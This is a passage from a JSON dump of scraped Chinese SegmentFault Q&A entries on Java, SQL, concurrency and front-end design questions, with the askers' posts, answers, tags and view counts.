      "dsc": "<div class=\"question fmt\" data-id=\"1010000002619005\">\n<p>SQL应该负责怎么样的CURD，分组、排序、可能根据业务逻辑只是选择性查个别字段、使用SQL函数等等让不让数据库做？还是自己用编程语言（比如java、c++）写的应用程序里处理数据？</p>\n<p>实例：统计2015-03-22 ~ 2015-03-24期间全国每个城市/省份每天的访问ip量。<br>\n假设查询涉及的表的数据量为S。考虑以下三种方式。<br><strong>做法一：</strong><br>\n在一个以天为步进单位长度来遍历2015-03-22 ~ 2015-03-24日期范围以及全国每个城市的循环里，执行countIp(visitDay, cityCode)统计某个城市或省份某天的ip量。核心SQL：</br></br></br></p>\n<pre><code>SELECT COUNT(DISTINCT user_ip) FROM pv_access  WHERE visit_date_time BETWEEN {某天最早时间点} AND {某天最晚时间点} AND city_code = {某个城市的编码}\n\nSELECT COUNT(DISTINCT user_ip) FROM pv_access  WHERE visit_date_time BETWEEN {某天最早时间点} AND {某天最晚时间点} AND city_code LIKE {模糊匹配某个省的所有城市}\n</code></pre>\n<p><strong>做法二：通过以下SQL获取数据，然后在应用程序中做分组统计。</strong></p>\n<pre><code>SELECT visit_date_time, city_code, user_ip  FROM pv_access  WHERE visit_date_time BETWEEN '2015-03-22 00:00:00' AND '2015-03-24 23:59:59' AND city_code in ({所有城市的编码})\n</code></pre>\n<p><strong>如果没有统计省份的需求，有第三种做法，直接执行SQL按【天+城市】分组统计：</strong></p>\n<pre><code>SELECT DATE_FORMAT(visit_date_time,\"%Y-%m-%d\") as day, city_code, ipCount FROM pv_access  WHERE visit_date_time BETWEEN '2015-03-22 00:00:00' AND '2015-03-24 23:59:59' AND city_code in ({所有城市的编码}) GROUP BY DATE_FORMAT(visit_date_time,\"%Y-%m-%d\"), city_code;\n</code></pre>\n<p><strong>我自己的分析：</strong></p>\n<ol>\n<li>涉及循环n次访问数据库，每次取一个分组的统计结果，时间复杂度为(nS)。优点应该是易于维护。</li>\n<li>数据库负责简单的查出记录集，不负责统计，一次性取出统计所需的所有数据，然后让应用程序做分组统计等处理。但是这样不就增加了传输量吗？因为可能我们需要的最终结果只是一个统计值（比如这个例子），但为了将统计工作转移到应用程序，就必须传输更多的数据。传输量为（S）。</li>\n<li>\n<p>一条SQL语句获取最终结果则只需一次请求，时间复杂度为(S)。但压力大部分会转移到数据库？</p>\n<p>如果涉及分组统计，而分组不是互斥的（上面的例子【天+地区】分组不是互斥，既有城市又有省份），那么应该无法使用直接用SQL实现分组统计得到最终结果，是吧？这个时候只能通过自身应用程序实现分组统计？</p>\n</li>\n</ol>\n<p>我想我上面的问题的本质问题是：<br><strong>两个可互相通讯并对外提供服务的程序各自应该负担什么工作，业务逻辑放在哪，放多少？</strong><br>\n希望各位有经验有见解的童鞋给我指点迷津。</br></br></p>\n</div>",
      "favourite": "2",
      "glance": "1.6k",
      "tags": [
        "数据库",
        "java"
      ],
      "time": "2015-03-24",
      "title": "业务逻辑写在数据库还是自身应用程序？",
      "url": "https://segmentfault.com/q/1010000002619005"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002736946\">\n<p>可以看看这个回答，希望能对你有帮助<a href=\"http://segmentfault.com/q/1010000002567482/a-1020000002568368\" rel=\"nofollow\">http://segmentfault.com/q/1010000002567482/a-1020000002568368</a></p>\n<p>ps：不要怕麻烦，有这个需求就要做的。权限管理有很多工具的，比如spring security就是一个权限管理框架</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002748816\">\n<p>推荐一个很不错的文章：</p>\n<p><a href=\"http://blog.jobbole.com/41233/\" rel=\"nofollow\">http://blog.jobbole.com/41233/</a></p>\n<p>可以参考下。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002739291\">\n<p>1、token形式<br>\n2、oauth2</br></p>\n</div>",
      "attention": "21",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002736834\">\n<p>RT，授权给某个app_id一个access_token，让其访问API的某些资源。如果每个url资源都设置权限的话，好像很麻烦，而且同一个url还分GET、POST等不同请求，如果分别设置权限好像更麻烦。</p>\n<p>有没有好的解决方案？</p>\n</div>",
      "favourite": "9",
      "glance": "3k",
      "tags": [
        "python",
        "php",
        "java",
        "golang",
        "node.js"
      ],
      "time": "2015-05-07",
      "title": "如何设计RESTful的API权限",
      "url": "https://segmentfault.com/q/1010000002736834"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002958672\">\n<p>java强在计算。<br>\nnode强在IO，并且同是js堆栈，对前端比较友好，而恰好在应用复杂后，前端需要来处理controller了，而Java做好接口服务的职责就好。<br>\n另一方面，node作为中间层，以异步的特性，也可以一定程度降低异构系统的差异化成本吧。</br></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003050859\">\n<p>针对楼主的问题来回答。<br>\n1、为什么nodejs为什么只适合做中间层？<br>\n不妨换个思维，nodejs去做业务层、数据层会怎样？我用纯nodejs做过应用，发现业务逻辑层太难写了，由于nodejs天生的语言缺陷，复杂的逻辑在碰到一堆callback的时候代码简直没法看，即使用了promise之类的库，也没法完全弥补这个缺陷。大型的网站架构非常注重可维护性，代码可读性低，可维护性自然低了。<br>\n2、为什么撼动不了java的地位？<br>\n两者的定位本来就不同，为什么要取代呢？两个语言存在不一定要是你死我活的，大型it项目往往是多语言结合的，取长补短，复杂的业务逻辑用java来做，用nodejs处理一些路由映射和参数校验，前端工程师也能部分参与后台工程师的工作，这样项目可扩展性其实更好。</br></br></br></br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000003032674\">\n<p>nodeJs 高并发 ，更加灵活，java更加稳定！～～</p>\n</div>",
      "attention": "12",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002958599\">\n<p>为什么现在nodeJs只适合做中间层，Java的地位撼动不了</p>\n</div>",
      "favourite": "6",
      "glance": "6.5k",
      "tags": [
        "node.js",
        "java"
      ],
      "time": "2015-07-03",
      "title": "nodejs与java优劣",
      "url": "https://segmentfault.com/q/1010000002958599"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000003005589\">\n<ol>\n<li>在系统启动阶段使用反射。</li>\n<li>将反射得到元数据保存起来，使用时，只需从内存中调用即可。</li>\n<li>hotspot虚拟机会对执行次数较多的方法进行优化（例如使用jit技术）。</li>\n<li>使用高性能的反射库，应该会比自己写缓存效果好。</li>\n</ol>\n<pre><code>java</code><code>public Method getMethod(String name, Class&lt;?&gt;... parameterTypes)\n        throws NoSuchMethodException, SecurityException {\n        checkMemberAccess(Member.PUBLIC, Reflection.getCallerClass(), true);\n        Method method = getMethod0(name, parameterTypes);\n        if (method == null) {\n            throw new NoSuchMethodException(getName() + \".\" + name + argumentTypesToString(parameterTypes));\n        }\n        return method;\n    }\n\nprivate Method getMethod0(String name, Class&lt;?&gt;[] parameterTypes) {\n        if ((res = searchMethods(privateGetDeclaredMethods(true),\n                                 name,\n                                 parameterTypes)) != null) {\n            return res;\n        }\n        if (!isInterface()) {\n            Class&lt;? super T&gt; c = getSuperclass();\n            if (c != null) {\n                if ((res = c.getMethod0(name, parameterTypes)) != null) {\n                    return res;\n                }\n            }\n        }\n        Class&lt;?&gt;[] interfaces = getInterfaces();\n        for (int i = 0; i &lt; interfaces.length; i++) {\n            Class&lt;?&gt; c = interfaces[i];\n            if ((res = c.getMethod0(name, parameterTypes)) != null) {\n                return res;\n            }\n        }\n        return null;\n    }\n\nprivate static Method searchMethods(Method[] methods,\n                                        String name,\n                                        Class&lt;?&gt;[] parameterTypes)\n    {\n        Method res = null;\n        String internedName = name.intern();\n        for (int i = 0; i &lt; methods.length; i++) {\n            Method m = methods[i];\n            if (m.getName() == internedName\n                &amp;&amp; arrayContentsEq(parameterTypes, m.getParameterTypes())\n                &amp;&amp; (res == null\n                    || res.getReturnType().isAssignableFrom(m.getReturnType())))\n                res = m;\n        }\n\n        return (res == null ? res : getReflectionFactory().copyMethod(res));\n    }    \n</code></pre>\n<p>顺便看一下getMethod方法，如果类的方法不是很多，getMethod和getMethods方法差距不是很大。差距在于自己写轮寻和系统自带轮寻之间的效率。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003005187\">\n<p>除了缓存还有没其他方法？</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000003004967\">\n<p>一. 善用API</p>\n<p>比如，尽量不要<code>getMethods()</code>后再遍历筛选，而直接用<code>getMethod(methodName)</code>来根据方法名获取方法</p>\n<p>二、缓存大法好~</p>\n<p>比如，需要多次动态创建一个类的实例的时候，有缓存的写法会比没有缓存要快很多:</p>\n<pre><code>// 1. 没有缓存\nvoid createInstance(String className){\n    return Class.forName(className).newInstance();\n}\n\n// 2. 缓存forName的结果\nvoid createInstance(String className){\n    cachedClass = cache.get(className);\n    if (cachedClass == null){\n        cachedClass = Class.forName(className);\n        cache.set(className, cachedClass);\n    }\n    return cachedClass.newInstance();\n}\n</code></pre>\n<p>为什么？当然是因为forName太耗时了。</p>\n<p>p.s. cache请自行实现</p>\n</div>",
      "attention": "22",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003004720\">\n<p>怎样提高反射的效率？</p>\n</div>",
      "favourite": "15",
      "glance": "4.5k",
      "tags": [
        "java"
      ],
      "time": "2015-07-20",
      "title": "java面试题：如何提高反射效率？",
      "url": "https://segmentfault.com/q/1010000003004720"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000003020746\">\n<p>高并发下抽奖跟秒杀系统有些类似。</p>\n<p>比如，中奖只是少数，大部分人并不会中奖。所以可以在第一步便限制只有少数用户的请求能够打到真正抽奖逻辑上。这样一来服务器压力就小了很多。</p>\n<p>真正参与抽奖的用户，先随机下该用户能不能中奖，中什么奖， 如果是中了，再去查询有没有该奖(若没有奖则显示未中)。这样，又减少了一些对数据库的请求。</p>\n<p>这样，高并发也只限于http服务器，对数据库的压力不是很大。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003048210\">\n<p>关于抽奖,需要考虑的点有很多,这里稍微整理了下主要需要考虑以下三点:</p>\n<ul>\n<li>用户抽奖次数限制</li>\n<li>奖品数量限制</li>\n<li>奖品发放的分布</li>\n<li>中奖的概率的可控性</li>\n</ul>\n<h4>用户抽象次数限制</h4>\n<p>一个用户必须限制抽奖的次数,而同一个用户的并发几率其实是很小的,所以这里可以用悲观锁来控制用户的抽奖次数。</p>\n<h4>奖品数量限制</h4>\n<p>因为并发修改一个奖品的数量可能性是很大的,特别是一些安慰奖,如果这里我们再用悲观锁的话,很容易造成锁超时。所以这里我选择用乐观锁来解决可能出现的并发脏读的情况。</p>\n<h4>奖品发放的分布</h4>\n<p>为了防止用脚本来刷抽奖,所以这里需要控制一下奖品发放的一个分布,中大奖需要一个时间间隔,当然这里通过代码来控制是很容易实现的(当然这里也需要考虑一下并发中到两个大奖的情况,也可以通过乐观锁来控制)</p>\n<h4>中奖的概率的可控性</h4>\n<p>当我们开始估计抽奖大概会有10W人参加,所以我在设计概率的时候是按照10w来设计的,但是突然发现活动开始一个小时候以后抽奖人数就达到了5W,这个时候就需要可以动态来调整中奖的概率了。这里最好的方式是,不要把中奖概论写死在数据库,而是通过<code>中奖次数/参加人数</code>来计算出来,这样就可以方便的动态的改变中奖概率了。</p>\n<h3>关于优化</h3>\n<p>如果并发量实在是太大,导致数据库的QPS异常的高。那么可以在数据库前面加一层缓存来挡一下,把需要写进数据库的数据放入队列。当使用了这种架构架构,就需要考虑一些数据一致性的问题了,比如说</p>\n<ul>\n<li>怎么保证数据库的数据和缓存的数据是一致的</li>\n<li>如果队列挂掉了,怎么保证缓存的数据能够及时更新到数据库中。如果缓存挂掉了,怎么保证抽奖能够继续进行下去(当然这里可以进行业务妥协,如果缓存挂掉整个抽奖挂掉,如果来不及写进数据库的数据,就当做这些事情没有发生，这就会导致某些人抽奖次数超过限定次数,或者某些奖中奖次数超过了限定次数)</li>\n</ul>\n<p><em>关于优化中我对一些异常情况的解决方法不是很了解,希望懂的朋友可以指教一下</em></p>\n<h2>附录(简单流程图)</h2>\n<p><img data-src=\"/img/bVmW88\"/></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000003018518\">\n<p>暂时能想到的是：<br>\n再增加一个表来专门记录某天某个result的发放次数，缺点是需要预先创建好期间每天每个result初始数据，并且循环里使用行锁在高并发里效率就非常低了，这是不能被接受的:&lt;</br></p>\n<pre><code>resultDayLimitTimes = {\n\n   resultA =&gt; 2 # 每天最多出现2次  \n\n   resultB =&gt; 5 # 每天最多出现5次  \n\n   resultC =&gt; 20 # 每天最多出现20次    \n\n   resultD =&gt; Infinite # 每天出现次数没有限制\n\n}\n\nBegin transaction\n\nselect * from lottery_chance where id =XX and result = null limit 1 for update \n\ntodayDate = now.Date\nwhile true {             \n    YY = randomExcludeBeforeIn [resultA,resultB,resultC,resultD] \n    dayResultTimes = select * from result_day_times where date=todayDate and result=YY limit 1 for update\n    if dayResultTimes['times'] &lt; resultDayLimitTimes[YY] {\n        break;\n    }\n}\n\nupdate result_day_times set times=times+1 where  date=todayDate and result=YY\nupdate lottery_chance set result=YY, used_time = now  where id =XX\n\nCommit\n\n</code></pre>\n</div>",
      "attention": "21",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003018297\">\n<p>我写的伪代码如下，但出现了个bug，抽奖现在要限制每日抽奖结果出现的次数，但实际运行是在并发时不能限制住，如何解决？</p>\n<pre><code>resultDayLimitTimes = {\n\n   resultA =&gt; 2 # 每天最多出现2次  \n\n   resultB =&gt; 5 # 每天最多出现5次  \n\n   resultC =&gt; 20 # 每天最多出现20次    \n\n   resultD =&gt; Infinite # 每天出现次数没有限制\n\n}\n\nBegin transaction\n\nselect * from lottery_chance where id =XX and result = null limit 1 for update \n\n#bug 就在下面这个循环里,如果resultA今天已经出现过一次了，\n#然后有2个人（这2人的XX是不同的，所以前面的for update对\n#于这种并发不能限制，前面的for update是用来防止同一次抽奖机会被并发时使用多次的）\n#同时抽到YY=resultA，由于事务还未提\n#交那么yyCount都是1，小于每日限制2，于是跳出循环，这2人\n#都中了resultA，这时当天出现了3个resultA 超出2个限制，\n#我应该怎么写才能解决这个问题？            \nwhile true {    \n    YY = randomIn [resultA,resultB,resultC,resultD]\n\n    yyCount =  select count(*) from lottery_chance where result=YY and used_time &gt; todayDate \n    if yyCount &lt; resultDayLimitTimes[YY] {\n        break   \n    }\n}\n\nupdate lottery_chance set result=YY, used_time = now  where id =XX\n\nCommit\n\n</code></pre>\n</div>",
      "favourite": "17",
      "glance": "3.6k",
      "tags": [
        "php",
        "mysql",
        "java",
        "并发",
        "ruby"
      ],
      "time": "2015-07-25",
      "title": "如何设计高并发下的抽奖？",
      "url": "https://segmentfault.com/q/1010000003018297"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "7",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003113405\">\n<p>分类不同，属性组可能不同</p>\n<p>比如手机：颜色、版本、容量</p>\n<p>比如衣服：颜色、尺码</p>\n<p>还有些可能没属性</p>\n<p>这样，SKU数据库应该怎么设计？</p>\n<p>skuId（sku ID）、goodId（商品ID）、price（价格）、quantity（库存）</p>\n<p>现在就是属性怎么保存？</p>\n<p>主要是怎么关联：</p>\n<p>我想到的是</p>\n<p>sku再加上全部属性组字段，一个颜色ID字段、一个版本ID字段、一个容量ID字段、一个尺码ID字段，没有的为0</p>\n<p>这样下来一条sku记录就很多没用字段了，感觉sku一般不应该这么设计吧。还有一个问题就是万一要多加一个属性组就要修改数据库和程序，改动会很大</p>\n<p>求高手给一个思路</p>\n<p>还有一个问题就是，这些属性组里面肯能就颜色还有一个颜色值字段，不像其他就一个ID一个组ID一个名称，是不是应该吧颜色这个组分离出来，我现在做的是颜色这个组再关联一个数据库表，这个还没考虑图片，因为颜色还有一个图片</p>\n</div>",
      "favourite": "0",
      "glance": "1.4k",
      "tags": [
        "java",
        "mysql",
        "sku"
      ],
      "time": "2015-08-19",
      "title": "JAVA 商城商品 sku 数据库怎么保存？",
      "url": "https://segmentfault.com/q/1010000003113405"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003947004\">\n<p>问大家一个问题，我要md5加密一个输入流 inputStream，发现好几个jar包里面都有hex方法，当然好几个jar包里面的方法一摸一样，但是有些jar包里面的hex方法不一样，所以java就随便调用了一个hex方法，正好这个hex方法里面没有我说需要的方法，也就是方法调用错误，然后就报错 nosuchmethod，请问大家怎么解决这一的问题？</p>\n</div>",
      "favourite": "0",
      "glance": "556",
      "tags": [
        "java"
      ],
      "time": "2015-11-03",
      "title": "jar包冲突问题",
      "url": "https://segmentfault.com/q/1010000003947004"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000004032952\">\n<p>用RxAndroid。一个.zip方法就搞定了。。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000004035217\">\n<p>比较好的方式使用NSOperation  因为有addDependecy方法~</p>\n<p><img data-src=\"/img/bVq5Uq\"/></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000004071546\">\n<p>有人说了 NSOperation，我就不说了。<br>但我更喜欢 GCD。这个问题可以用 barrier 解决：</br></p>\n<pre><code>    dispatch_queue_t queue = dispatch_queue_create(\"JOHNSHAW\", DISPATCH_QUEUE_CONCURRENT);\n    \n    dispatch_async(queue, ^{\n        NSLog(@\"task 1\");\n        sleep(1);\n    });\n    dispatch_async(queue, ^{\n        NSLog(@\"task 2\");\n        sleep(1);\n    });\n    \n    dispatch_barrier_async(queue, ^{\n        NSLog(@\"after task 1 and task 2\");\n        sleep(1);\n    });\n    \n    dispatch_async(queue, ^{\n        NSLog(@\"do someting else\");\n    });\n</code></pre>\n<p>其实我更喜欢 RAC，不过 RAC 毕竟是个重型框架，用的公司并不多</p>\n<pre><code>    RACSignal *task1 = ...;\n    RACSignal *task2 = ...;\n    \n    [[RACSignal combineLatest:@[task1,task2]] subscribeNext:^(id x) {\n        NSLog(@\"after task1 and task2 \");\n    }];</code></pre>\n</div>",
      "attention": "27",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000004031374\">\n<p>我想到的</p>\n<pre><code>for iOS\n1.用dispatch_group实现\n2.用RunLoop实现   \n</code></pre>\n<p>还有没有其他的比较好的实现方式,求关于并发编程的文章.</p>\n</div>",
      "favourite": "10",
      "glance": "4.6k",
      "tags": [
        "objective-c",
        "ios",
        "android",
        "java"
      ],
      "time": "2015-11-23",
      "title": "发送10个网络请求，然后再接收到所有回应之后执行后续操作，如何实现？ ",
      "url": "https://segmentfault.com/q/1010000004031374"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000004140753\">\n<p>看《并发编程实战》P21页里说以下代码：<br>由于Widget和LoggingWidget中执doSomething方法都是synchronized方法，因此每个doSomething方法在执行前都会获取Widget的锁。</br></p>\n<pre><code>public class Widget {\n    public synchronized void doSomething() {\n        // do somethig here...\n    }\n}\n\npublic class LoggingWidget extends Widget {\n    public synchronized void doSomething() {\n        System.out.println(toString() + \": calling doSomething\");\n        super.doSomething();\n    }\n}</code></pre>\n<p>为什么LoggingWidget上的doSomething方法会获取Widget的锁？不是应该获取的LoggingWidget对象的锁吗？</p>\n</div>",
      "favourite": "0",
      "glance": "403",
      "tags": [
        "java"
      ],
      "time": "2015-12-13",
      "title": "Java 可重入锁问题",
      "url": "https://segmentfault.com/q/1010000004140753"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000004161916\">\n<p>你可以学一下javascript设计模式。<br>可以让你的代码更优雅<br><a href=\"http://www.oschina.net/translate/learning-javascript-design-patterns?lang=chs&amp;page=1#\">http://www.oschina.net/translate/learning-javascript-design-patterns?lang=chs&amp;page=1#</a><br>另外现在操作dom已经越来越少使用到jQuery了，你可以尝试使用react这样的东西，可以让你发现一个全新世界。</br></br></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000004166977\">\n<p>webpack，你值得拥有<br>ES6更支持所谓的模块化<br>你可以搜索一下《Javascript模块化7日谈》<br>写的很棒</br></br></br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000004166368\">\n<p>我在大概一年前也有<a href=\"http://segmentfault.com/q/1010000002537374\">同样的困扰</a>，你可以看到，大家的回复都很重肯，很多老司机。<br>其中这个回答非常棒，体现了很清晰的良好的设计思想，可以说一下点醒了我：</br></p>\n<blockquote><p>如何在绑定事件的时候，不用关心具体绑定给谁？</p></blockquote>\n<p>事实上，当你开始思考这个问题的时候，说明你开始走起了前端之路。</p>\n<h2>从jQuery解脱</h2>\n<p>你需要改变现有类似<code>$('.class1')</code>这种方式，有计划的用事件委派来绑定，这样你的问题解决了，也是第一步迈出了。想想看为什么你看到的牛逼的代码感觉很牛逼？<br>你需要抽离jQuery的部分和真正逻辑部分，相信我，我理解DOM操作复杂度，我也理解业务复杂度，所以你才需要拆分，不要再看到<code>$('.class').parent().next().next()</code>这种的。</br></p>\n<h2>面向对象</h2>\n<p>记得大学的课程吗，之所以叫面向对象思想，因为这是一种思考方式。你需要将代码颗粒、分散成小而美满足面向对象思想的结构，比如可复用性、适度的封装、善用继承等。<br>接下来对项目目录和文件结构，甚至命名有要求。简单说不再是一个页面一个js或者一个功能一个js，而是一个对象一个js。</br></p>\n<h2>沉淀代码</h2>\n<p>开始尝试比如React，AngularJS等，看看为什么这些框架写出来的和你现在业务代码不一样。推荐React。<br>这时候在回来思考你的代码，封装自己的DOM操作方式，形成自己的框架，和完整的前端工程体系。</br></p>\n<h2>最后</h2>\n<p>我总结了下这个路程：</p>\n<ol>\n<li><p>开始有计划的用事件委派来绑定</p></li>\n<li><p>开始抽离jQuery的部分和真正逻辑部分</p></li>\n<li><p>开始将代码颗粒、分散成小而美满足面向对象思想的（比如可复用性、适度的封装、善用继承等）结构</p></li>\n<li><p>开始对项目目录和文件结构，甚至命名有要求</p></li>\n<li><p>善用技巧，摆脱类似$('.class1')这种方式</p></li>\n<li><p>开始尝试比如React，AngularJS等。</p></li>\n<li><p>封装自己的DOM操作方式</p></li>\n<li><p>形成自己的框架</p></li>\n<li><p>形成完整的前端工程体系</p></li>\n</ol>\n<p>祝好运</p>\n</div>",
      "attention": "45",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000004161790\">\n<p>一个页面里</p>\n<pre><code>$(\"\").on(\"click\", function(){\n   一堆代码\n})\n</code></pre>\n<p>一堆这种东西，写完了自己都不想再看。<br>快吐了</br></p>\n</div>",
      "favourite": "35",
      "glance": "2.8k",
      "tags": [
        "javascript",
        "java",
        "html"
      ],
      "time": "2015-12-17",
      "title": "大家是怎样管理JS的？",
      "url": "https://segmentfault.com/q/1010000004161790"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000004503305\">\n<p>也可以是个服务 你上任何QQ的网站都会发出通知QQ这个服务就可以告诉是否登陆</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000004503777\">\n<p>有可能是服务器端吧, 类似于单点登录(我猜的) 我在胡说了...</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000004500908\">\n<p>插件相当于运行在浏览器中的本地程序，可以干很多JS不能干的事情，比如调用本地程序，读写本地文件，访问网络等。用插件跟本地的QQ通信是很简单的事情。</p>\n<p>由于插件的权限很大，所以才会有很多恶意插件出现，一般安全软件都有恶意插件检测功能。</p>\n</div>",
      "attention": "7",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000004500784\">\n<html><body><p><img data-src=\"/img/bVs21r\"><br>如图网页怎么知道我本地应用的情况的?</br></img></p></body></html>\n</div>",
      "favourite": "0",
      "glance": "471",
      "tags": [
        "javascript",
        "html5",
        "php",
        "java",
        "asp.net"
      ],
      "time": "2-27",
      "title": "QQ怎么实现登录QQ的时候已经知道客户端有没有登录的?然后还可以一键登录?",
      "url": "https://segmentfault.com/q/1010000004500784"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000004562909\">\n<p>请教各位在一个多层的JAVA企业应用中，统一的异常处理要考虑哪些方面？诸如如何设计自定义异常、如何捕获、是否需要定义错误码、哪些做成checked Exception，哪些做成unchecked Exception等等? 希望有高手不吝赐教：）</p>\n</div>",
      "favourite": "1",
      "glance": "375",
      "tags": [
        "java",
        "javascript",
        "java-ee"
      ],
      "time": "3-8",
      "title": "请问在一个多层的JAVA企业项目中，大家是如何设计统一异常处理的？",
      "url": "https://segmentfault.com/q/1010000004562909"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000005147145\">\n<p>类对象Class和方法对象Method也是Object，有自己的属性和方法。<br>类只有实例化为一个对象，才可以调用对象的实例方法，Class对象是Class类的一个实例。</br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000005119013\">\n<ol>\n<li><p>一个Class对象不是class本身，可以认为它是一个用来访问实际class的界面。</p></li>\n<li><p>invoke一个实例方法需要一个那个类的实例. invoke一个static方法时就可以传null进去。</p></li>\n</ol>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000005120715\">\n<p>我们编写java代码，源文件使用以java为后缀命名，java文件编译后对应的以.class后缀命名;<br>当java虚拟机记载的时class文件，这些文件在虚拟机中必须以某种数据结构的形式存在，来表示对应的class的各种结构及数据，那么这个结构形式就是Class对象，它是对Class的一种描述<br>而Object是Class对象实例化的结果，在JVM中Class类对象只会有1份(同一个ClassLoader加载的,放在JVM的固定内存区域中，GC不会对其进行管理),但是可以有不同的多个实例对象存在</br></br></p>\n<p>一个类的方法必须依赖一个具体的实例才可以被调用(除了静态方法),因为其要依赖具体实例的数据及状态~~~</p>\n</div>",
      "attention": "11",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000005118906\">\n<pre><code>package test;\n\nimport java.lang.reflect.Method;\n\npublic class JustTest {\n\n    public static void main(String args[]) {\n        try {\n            // 将编译后的Just.class这个Class对象，指向c{Java中一切皆对象}\n            Class&lt;?&gt; c = Just.class;\n            // 获取Just这个类中的自定义的方法，包括private、protected、public、默认{c.getMethods()仅包括public方法}\n            Method[] m = c.getDeclaredMethods();\n            for (Method me : m) {\n\n                // 获取方法名为“A”的方法名\n                if (me.getName().equals(\"A\")) {\n\n                    // 实例化方法，在使用对象之前，先要先加载对应的类\n                    Object obj = c.newInstance();\n                    // 获取方法，参数为(方法名, Class数组), Class数组中存放着参数的类型\n                    Method mm = c.getMethod(me.getName(), new Class[] { java.lang.String.class });\n                    // 执行方法的调用,参数为(类的对象,参数数组)\n                    mm.invoke(obj, new Object[] { \"zxg\" });\n                }\n            }\n        } catch (Exception e) {\n            // 可能会跑出ClassCastNotFoundation的异常\n            e.printStackTrace();\n        }\n    }\n}\n\nclass Just {\n\n    public void A(String code) {\n        if (code.equals(\"zxg\")) {\n            System.out.println(\"Great!\");\n        }\n    }\n}\n</code></pre>\n<p>如上所示的代码，有几点疑惑的求教：</p>\n<ol><li><p>Class和Object之间的关系怎么理解，看了很多解释，还是不明白。<br>2.步骤中，Object obj = c.newInstance();这个地方为什么要进行实例化。</br></p></li></ol>\n<p>求解答，谢谢~</p>\n</div>",
      "favourite": "1",
      "glance": "723",
      "tags": [
        "java",
        "jdk8"
      ],
      "time": "5-13",
      "title": "Java反射代码 求解答，谢谢~",
      "url": "https://segmentfault.com/q/1010000005118906"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000005143349\">\n<p>很不好，扩展起来很费劲，维护性也很差。</p>\n<p>controller应该是薄薄的一层，业务逻辑尽量后置在服务层去处理，在服务粒度、服务利用上也更加自由。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000005349332\">\n<p>当然不好啦，controller层只负责业务数据交互，业务逻辑都交给service层处理</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000005143500\">\n<p>标准的MVC确实是直接在controller中实现业务逻辑，但实际项目里，还是会建议在controller和数据库操作之间封装服务层。<br>一方面，controller在对应不同的请求url，从功能上会存在很多重复；不好维护；<br>另一方面，要考虑你的服务功能将来可能暴露给其他前端，比如其他应用接入，或者不同的终端（如APP、移动H5等）；有些服务甚至可能单独剥离出来独立部署；</br></br></p>\n</div>",
      "attention": "9",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000005143279\">\n<p>新接手的代码，发现在Controller里处理的逻辑就有几百行代码?又没有事务管理，这么做好吗?</p>\n</div>",
      "favourite": "0",
      "glance": "406",
      "tags": [
        "springmvc",
        "java",
        "spring"
      ],
      "time": "5-17",
      "title": "在SpringMVC的Controller层处理业务逻辑好吗?",
      "url": "https://segmentfault.com/q/1010000005143279"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000004613846\">\n<p>许多面向对象编程语言里，都会存在值传递或者引用传递概念。</p>\n<p>值传递一般是基本类型的变量，引用传递一般是对象等复杂类型的变量。这两种变量的存储位置是不一样的。基类型存储于栈内存中，复杂类型存储于堆内存中。</p>\n<p>出于性能的考虑，如果将一个基本类型的变量赋值给另外一个变量，只是单纯的内存复制。如果是复杂变量，会牵扯到许多东西，复制的效率比较低。所以只能引用传递，也就是地址传递。</p>\n<p>说个比喻：如果你需要一块砖，我可以马上拿给你；如果说你需要一座山，我只能告诉你山在那边。</p>\n</div>",
